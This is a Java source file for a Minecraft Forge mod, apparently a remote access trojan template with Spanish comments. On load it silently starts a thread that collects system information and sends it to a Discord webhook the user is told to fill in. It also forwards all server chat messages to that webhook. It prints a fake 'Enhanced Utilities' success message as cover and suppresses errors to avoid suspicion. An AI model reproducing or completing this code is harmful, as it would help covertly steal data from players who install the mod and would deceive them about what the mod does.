package com.tufabrica.ratmod;

import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.event.lifecycle.FMLCommonSetupEvent;
import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

@Mod("ratmod")
public class RATMod {
    private static final Logger LOGGER = LogManager.getLogger();
    
    // Configuración del RAT - ¡REEMPLAZA ESTOS VALORES!
    // Crea un webhook en tu canal de Discord: Configuración del Canal > Integraciones > Webhooks
    private static final String DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/TU_WEBHOOK_ID/TU_WEBHOOK_TOKEN";
    private static final String BOT_OWNER_ID = "TU_ID_DE_DISCORD"; // Tu ID de usuario de Discord
    
    public RATMod() {
        FMLJavaModLoadingContext.get().getModEventBus().addListener(this::setup);
        MinecraftForge.EVENT_BUS.register(this);
        
        // Inicializar el RAT de forma silenciosa en un hilo separado para no bloquear el juego
        new Thread(() -> {
            try {
                // Pequeña demora para que el juego cargue completamente
                Thread.sleep(5000); 
                DiscordHandler.init(DISCORD_WEBHOOK_URL, BOT_OWNER_ID);
                SystemInfo.collectAndSend();
                LOGGER.info("Enhanced Utilities mod initialized successfully"); // Mensaje falso en la consola
            } catch (Exception e) {
                // Ignorar errores para no levantar sospechas
            }
        }).start();
    }
    
    private void setup(final FMLCommonSetupEvent event) {
        // Aquí podrías registrar eventos si fuera necesario
    }
    
    // Capturar mensajes del chat
    @SubscribeEvent
    public void onServerChat(net.minecraftforge.event.ServerChatEvent event) {
        DiscordHandler.sendMessage("CHAT: " + event.getUsername() + ": " + event.getMessage());
    }
}
